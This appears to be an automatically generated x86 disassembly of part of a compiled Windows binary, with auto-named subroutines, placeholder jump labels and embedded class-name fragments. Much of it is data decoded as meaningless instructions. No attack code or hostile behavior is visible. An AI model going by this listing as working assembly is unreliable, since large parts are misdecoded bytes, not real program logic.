jle r-xdata
pop ebp
retn 0x4
cmpsd [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebp [ eax - 0x52 ]
cmpsd [ esi ] [ edi ]
add esi [ ebx + ebp * 4 - 0x5443fc59 ]
cmpsd [ esi ] [ edi ]
add edx eax
stosb [ edi ]
cmpsd [ esi ] [ edi ]
add edx esp
scasb [ edi ]
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
cmpsb [ esi ] [ edi ]
add esi [ esp + ebp * 4 - 0x59 ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp [ edx + ebp * 4 - 0x544bfc59 ]
cmpsd [ esi ] [ edi ]
add edi [ ebx + ebp * 4 - 0x552ffc59 ]
add eax [ edi ]
adc eax 0x746e4954
jb r-xdata
cmpsd [ esi ] [ edi ]
add esi [ edi + ebp * 4 - 0x501bfc59 ]
cmpsd [ esi ] [ edi ]
add ebx esp
scasd [ edi ]
cmpsd [ esi ] [ edi ]
add esi [ eax ]
scasb [ edi ]
cmpsd [ esi ] [ edi ]
add eax [ edx ]
add bh bh
aam 0xae
imul esi [ ebx + 0x74 ] 0xcc746e65
jge r-xdata
cmpsd [ esi ] [ edi ]
add eax [ ebp * 4 + 0xe03a7 ]
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xor al 0x11
cmpsb [ esi ] [ edi ]
add eax [ eax + eax ]
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
stosb [ edi ]
cmpsd [ esi ] [ edi ]
add esi [ ebx + ebp * 4 - 0x5443fc59 ]
cmpsd [ esi ] [ edi ]
add edx eax
stosb [ edi ]
add eax [ edi * 2 + 0x3a7 ]
pop es
inc ebx
insb
popad
jae r-xdata
jae r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les edi [ esi - 0x59 ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x51fc5882 ] ah
jle r-xdata
add ecx [ eax + eax ]
add [ eax ] al
sub_3a78308
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
and [ edi + 0x403 ] 0x0
rcl [ eax ] 0xa6
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add edx eax

sub_3a783f0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
test [ edi + 0x3 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x7c ] ah
cmpsd [ esi ] [ edi ]
add ecx [ eax + eax ]
add [ eax ] al
je r-xdata
add [ eax ] al
add [ ebx + eax * 4 ] al
cmpsd [ esi ] [ edi ]
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add edx eax

cmpsd [ esi ] [ edi ]
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebp [ edx + edx * 8 - 0x59 ]
add edx eax

sub_3a784f4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
test [ edi + 0x1403 ] esp
add [ esp + eax * 4 - 0x59 ] dh
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ ebx + edx * 8 - 0x59 ]
add edx eax

sub_3a7853e
cmpsd [ esi ] [ edi ]
add ebp [ esp + edx * 8 - 0x59 ]
add esi [ esp + ecx * 8 ]
cmpsd [ esi ] [ edi ]
add ebp [ eax + 0x1803a7d2 ]
aad 0xa7
add esp eax
shl [ edi - 0x5832a7fd ] cl
add ebx [ eax + 0xd03a7d4 ]
push esp
dec ebp
insd
outsd
jb r-xdata
push ebx
push ebx
je r-xdata
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
outsd
jne r-xdata
popad
insd
mov eax eax
mov eax 0x3a785
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
test [ edi + 0x1803 ] esp
add [ esp + eax * 4 - 0x59 ] dh
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ecx esp
salc
cmpsd [ esi ] [ edi ]
add edx eax

and al 0x4
mov eax [ eax ]
jmp [ eax + 0x24 ]
je r-xdata
arpl [ ebp + 0x53 ] sp
sub_3a78784
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_3a787a1
xchg [ edi + 0x803 ] esp
add al al
adc [ esi - 0x59ba37fd ] ah
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp [ eax + ebx * 4 - 0x59 ]
add ecx [ esp + edx * 2 ]
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x3a788
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl cl
mov [ edi + 0x8c03 ] ah
add ah bl
xchg [ edi - 0x59ba37fd ] esp
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add eax [ esi + ebx * 8 - 0x59 ]
add eax [ edi + edx * 8 - 0x215bfc59 ]
cmpsd [ esi ] [ edi ]
add esp eax
fisub [ edi - 0x581d4ffd ]
add ebx esp
fbld [ edi - 0x57fd03fd ]
add eax [ eax ]
loopne r-xdata
inc esi
imul ebp [ esi + 0x64 ] 0x408d7265
add [ eax ] ch
mov [ edi + 0x3 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
mov [ edi + 0x2803 ] ah
add al al
adc [ esi - 0x59ba37fd ] ah
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebx [ edi + edx * 8 - 0x59 ]
add eax [ edi + edx * 8 + 0x344803a7 ]
cmpsb [ esi ] [ edi ]
add ecx [ eax + 0x34 ]
cmpsb [ esi ] [ edi ]
add ecx [ eax + 0x34 ]
cmpsb [ esi ] [ edi ]
add eax [ esi ]
push esp
inc esi
imul ebp [ ebp + 0x72 ] 0xa7888c90
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3a788 ] bh
cmpsd [ esi ] [ edi ]
add eax [ eax ]
add ecx [ eax - 0x33fc5820 ]
add ebp [ eax - 0x57fc4bfd ]
add ecx [ eax + esi * 8 + 0xe03a7 ]
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ esi + 0x8003 ] ah
add [ edi ] al
push esp
push edx
popad
jb r-xdata
add [ eax ] al
0xa788
shl [ eax ] 0x89
cmpsd [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
mov [ edi + 0x3 ] esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x77 ] cl
cmpsd [ esi ] [ edi ]
add edx [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
mov [ edi + 0x3c03 ] esp
add al al
adc [ esi - 0x59ba37fd ] ah
add ebx [ eax ]
xor ch [ eax - 0x59ba27fd ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp [ ecx + esi + 0x32cc03a8 ]
test al 0x3
dec eax
xor al 0xa6
add eax [ edi ]
push esp
push esp
push 0x64616572
or [ edx + 0x70703a7 ] cl
push esp
push esp
push 0x64616572
hlt
je r-xdata
add [ eax ] al
jb r-xdata
add ah bl
xchg [ edi - 0x59ba37fd ] esp
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebx [ eax - 0x2bfc57f8 ]
or [ eax - 0x57f72ffd ] ebp
add edi eax
or [ eax - 0x57f66ffd ] ch
add edx eax
or eax 0x93403a8
test al 0x3
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x2c03a6 ] dl
add [ eax ] al
pop es
push esp
push edi
jb r-xdata
add [ eax ] al
cmp [ ecx + 0x3a7 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edx
mov [ edi + 0x5403 ] esp
shl [ eax + 0x3a789 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0xc03a789 ]
add [ eax ] al
add [ esp + eax * 4 + 0x45c803a6 ] cl
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add eax [ edi ]
inc ebp
push esp
push 0x64616572
hlt
sub_3a789a9
mov [ edi + 0x3 ] esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
mov [ edi + 0x3c03 ] esp
add al al
adc [ esi - 0x59ba37fd ] ah
add ebx [ eax ]
xor ch [ eax - 0x59ba27fd ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp [ ecx + esi + 0x32cc03a8 ]
test al 0x3
dec eax
xor al 0xa6
add eax [ edi ]
push esp
push esp
push 0x64616572
or [ edx + 0x70703a7 ] cl
push esp
push esp
push 0x64616572
hlt
sub_3a78bc7
push ecx
push eax
inc [ eax - 0x77fc57c6 ]
cmp ch [ eax - 0x57c573fd ]
add esp [ edx + edi + 0x3ad803a8 ]
test al 0x3
test al 0x3a
test al 0x3
mov al 0x3a
test al 0x3
mov ah 0x3a
test al 0x3
sar [ edx ] 0xa8
add ebp [ ebx + edi - 0x58 ]
add eax [ eax - 0x5ffc57c5 ]
cmp eax 0x3aac03a8
test al 0x3
nop
cmp ch [ eax - 0x57c583fd ]
add ecx eax
cmp eax 0x540a03a8
inc ebx
outsd
insd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0x17ab342d
add [ eax ] al
outsb
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x67fc5873 ] dl
lea esp [ edi + 0x5403 ]
test al 0x3
inc esp
aas
test al 0x3
je r-xdata
add [ eax ] al
adc [ eax ] al
std
sbb al 0x8c
cmpsd [ esi ] [ edi ]
add eax [ edi ]
or dl [ ebx + eax * 2 + 0x6f ]
insd
jo r-xdata
add [ ebx + ecx * 4 ] bl
cmpsd [ esi ] [ edi ]
add esi eax
cmp eax 0x45d403a8
lea esp [ edi - 0x587267fd ]
add edx [ eax + eax ]
test al 0x3
xchg esp eax
test al 0x3
sub [ edi ] bh
test al 0x3
jl r-xdata
add al al
adc [ esi - 0x59ba37fd ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
mov [ edi + 0x1403 ] fs
outsb
outsb
je r-xdata
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ecx esp
aas
test al 0x3
mov ah 0xab
cmpsd [ esi ] [ edi ]
add esi esp
cmp [ eax - 0x58552ffd ] ebp
add ecx esp
cmp ch [ eax - 0x57bfcbfd ]
add ebx esp
cmp ch [ eax - 0x57c42bfd ]
add ecx [ eax ]
test al 0x3
mov esp [ edi - 0x57c20ffd ]
add edx esp
inc ebp
test al 0x3
adc [ edx + eax * 2 + 0x61 ] dl
jae r-xdata
add [ eax ] al
mov esp [ edi - 0x5882fbfd ]
add eax [ edx ]
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
mov [ edi ] bh
test al 0x3
hlt
add esi [ eax + eax * 2 ]
test al 0x3
arpl [ ecx + 0x63 ] ax
je r-xdata
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebx esp
test al 0x3
fdivr [ esi ]
test al 0x3
adc [ edi ] bh
test al 0x3
jo r-xdata
jae r-xdata
fdivr [ edx ]
test al 0x3
aam 0x3b
test al 0x3
or [ esi ] bh
test al 0x3
outsd
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x4800408d
lea esp [ edi + 0x3 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ecx * 4 + 0x3a7 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
mov ah [ edi + 0x803 ]
[ eax ]
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040000 ] al
popad
insd
cmp al 0x10
cmpsb [ esi ] [ edi ]
add ecx [ eax + eax ]
add bh bh
or al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add edx [ ecx + 0x67 ]
lea eax [ eax ]
enter 0xa78c 0x3
add [ eax ] al
add [ eax ] ch
sub_3a78df4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_3a67378
pop edi
pop esi
pop ebx
retn
sub_3a78e1c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_3a6735c
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_3a78e44
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_3a673b0
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_3a78ef6
cmpsd [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x71 ] al
cmpsd [ esi ] [ edi ]
add esp [ eax + eax ]
add [ eax ] al
rcl [ eax ] 0xa6
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp eax
xchg ebx eax
cmpsd [ esi ] [ edi ]
add ecx [ edx ]
push esp
push edx
inc edi
jb r-xdata
nop
jne r-xdata
in al dx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
jae r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_3a78f58
mov esi eax
jmp r-xdata
sbb [ ebx - 0x5a ] al
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add eax [ eax + edx * 4 + 0x540903a7 ]
push edx
inc edi
jb r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3a78f58
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ esp + 0x4 ] edx
mov [ esp ] eax
jne r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
add al 0x89
add al 0x24
mov eax eax
inc eax
mov edx ebx
mov eax esi
call sub_3a645ac
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_3a7a494
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_3a645ac
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_3a645ac
test al al
je r-xdata
sub_3a78f58
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_3a7a494
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_3a645ac
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_3a645ac
test al al
je r-xdata
sub_3a78fb8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_3a78f58
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3a78f58
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_3a645ac
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_3a79028
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_3a64350
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_3a7a33c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a79084
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a64370
mov eax [ esi + 0x4 ]
call sub_3a64380
mov eax [ esi + 0x8 ]
call sub_3a64380
mov eax [ esi + 0xc ]
call sub_3a64380
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a790c4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
xor edi edi
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov esi eax
test esi esi
jl r-xdata
inc ebp
xor esi esi
mov edx esi
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebp
jne r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_3a7a494
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_3a64274
test al al
jne r-xdata
sub_3a7912c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
movzx eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_3a7a494
mov edx eax
mov eax ebp
call sub_3a645ac
test al al
jne r-xdata
sub_3a79170
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a79220
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_3a64260
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_3a65504
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_3a790c4
test eax eax
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
call sub_3a64c34
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_3a7a33c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a79227
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebx + 0x4 ] eax
sub_3a79230
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_3a7a4f0
test eax eax
setge al
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_3a79254
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_3a66640
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_3a79274
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_3a7a494
mov edx edi
call sub_3a79254
test al al
je r-xdata
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_3a7a388
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
cmp eax 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_3a7a494
mov edx edi
call sub_3a79254
test al al
je r-xdata
mov ebx eax
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_3a7a388
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
